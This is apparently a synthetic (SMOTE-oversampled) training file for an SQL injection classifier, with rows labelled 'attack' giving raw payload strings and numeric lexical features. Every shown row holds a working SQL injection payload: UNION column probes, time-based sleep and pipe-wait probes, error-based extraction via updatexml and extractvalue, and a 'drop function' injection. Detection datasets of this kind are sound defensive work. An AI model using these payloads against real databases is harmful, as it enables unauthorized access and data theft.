id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000184,attack,union,"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",nearest_attack_euclidean,R003429,0.3599513758949943,88.7600513356174,29.25067008904116,4.22070851388928,52.008041068493924,9.0,17.0,10.752010267123481,0.5848754088678506,0.10190112211522864,0.1924798973287652,0.12074357168815551,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.752010267123481,3.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000185,attack,other,if  (  4135  =  2165  )   select 4135 else drop function otyy--,nearest_attack_euclidean,R004171,0.0071848526185793226,63.0,25.0,4.0362350214953,28.0,12.0,18.0,5.0,0.4444444444444444,0.19047619047619047,0.2857142857142857,0.07936507936507936,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000186,attack,time,select pg_sleep  (  5  )   and   (  'aydg'  =  'aydg,nearest_attack_euclidean,R001576,0.13585614436287816,53.233871120357676,18.17626730290824,3.4064247087063166,24.0,1.0,20.057603817449433,8.17626730290824,0.4518862754600443,0.01882859481083518,0.37566878983721474,0.15361633989190582,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.176267302908239,0.0,1.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000187,attack,other,1 where 1015  =  1015,nearest_attack_euclidean,R003105,0.02129984371089353,20.999999999999986,9.0,2.824972647816642,5.0,9.0,6.0,0.9999999999999982,0.23809523809523808,0.42857142857142855,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000188,attack,boolean,"1"" and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""wtkx""  =  ""wtkx",nearest_attack_euclidean,R001626,0.03601483665915562,194.78932137795675,31.976784665354213,3.725111293817704,120.0,12.0,45.65002937008204,17.139292007874722,0.6164152974010939,0.06164152974010939,0.234006742534542,0.08793643032425463,0.0,4.0,0.0,0.0,1.0,2.0,0.0,4.139292007874722,0.0,0.0,6.0,3.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,other,"iif  (  2869  =  9448,1,1/0  )  ",nearest_attack_euclidean,R003464,0.008710859632166296,32.0,15.0,3.2766433870211475,3.0,11.0,12.0,6.0,0.09375,0.34375,0.375,0.1875,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.9999999999999991,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.440892098500626e-16
SMOTE_000190,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008388,0.0920711404326382,142.35242251464584,31.823788742677085,4.11107336253789,73.14537317259894,8.911894371338544,42.55947185669272,17.73568311401563,0.5136633498675742,0.06262382780717059,0.2990686299209239,0.1246441924043312,1.0,0.0,2.0,0.0,1.0,1.0,0.0,5.911894371338543,0.0,0.0,2.9118943713385432,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000191,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R002846,0.031309268923292784,55.0,19.0,3.8071717752884378,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.0727272727272727,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000192,attack,union,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",nearest_attack_euclidean,R002073,0.01057061686459867,66.08891391722922,20.0,3.684225963104404,14.0,24.071131133783382,18.0,10.017782783445845,0.21185557088322468,0.36418282561165205,0.2723857339927174,0.1515758695124058,0.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.0177827834458455,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000193,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R008073,0.9024463778617864,139.2209201343734,29.139534365865302,3.712428678455266,52.802317036777474,18.151164085336745,53.55813746346121,14.709301548797953,0.36973262156115877,0.13565893464620635,0.3883671376638541,0.10624130612878077,0.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.4302328170673493,1.5697671829326507,3.0,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000194,attack,error,"-5520""   )    )    as utqk where 7762  =  7762 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006751,0.11320902183814882,369.9453135808662,36.56361622583803,3.608433809095599,91.0,60.0,157.3816973550282,61.56361622583803,0.2460040175225331,0.16220045111375808,0.42538070394004396,0.16641482742366487,0.0,1.0,3.0,0.0,0.0,3.0,0.0,31.56361622583803,0.0,0.0,1.0,26.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000195,attack,error,"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",nearest_attack_euclidean,R007074,0.757057080520081,142.23758814739145,25.0,3.6045948857787145,32.381205926304276,38.460401975434756,53.31678419652193,18.07919604913048,0.22797864682436048,0.2705894287688993,0.3744178210912611,0.12701410331547916,0.0,0.0,0.0,0.0,0.0,1.0,0.0,11.079196049130482,0.0,0.0,6.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,0.460401975434759,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.460401975434759
SMOTE_000196,attack,time,1' and sleep  (  5  ) ,nearest_attack_euclidean,R002468,0.26668299116305527,23.15126804547063,13.0,3.0430413964965943,8.32893372727732,2.0,9.65786745455464,3.16446686363866,0.3605429430036616,0.08730010017093846,0.4155355354090385,0.13662142141636152,1.0,0.0,0.0,0.0,0.0,0.0,0.0,2.164466863638661,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.8355331363613387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8355331363613392
SMOTE_000197,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",nearest_attack_euclidean,R006169,0.04119419507932953,287.9008671099655,37.935345124115614,3.608634844848557,82.0,29.0,127.09483173761862,49.80603537234684,0.2849600230271095,0.10077854472909968,0.44126596624053466,0.1729954660032562,4.0,0.0,0.0,0.0,0.0,2.0,0.0,27.806035372346845,0.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000198,attack,union,-8143  )   union all select 3014--,nearest_attack_euclidean,R001521,0.06941338778833026,34.0,18.389016726202193,3.8306469132526173,14.0,8.0,8.0,4.0,0.4117647058823529,0.23529411764705882,0.23529411764705882,0.11764705882352941,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000199,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R007208,0.07951281962696626,140.0,26.870514407166418,3.7004890610682453,36.611543221499254,35.51794237133433,50.741028814332836,17.129485592833582,0.26151102301070894,0.2536995883666737,0.3624359201023774,0.12235346852023987,0.0,1.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.129485592833581,0.9999999999999996,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,boolean,"1%""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R006522,0.329557402601456,152.41155502301567,31.0,3.605822296943717,39.0,16.0,66.50962918584639,30.90192583716928,0.25725363867236845,0.10553995432712553,0.43426038103389,0.20294602596661607,0.0,4.0,0.0,0.0,0.0,2.0,0.0,12.901925837169278,2.0,2.0,1.0,8.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
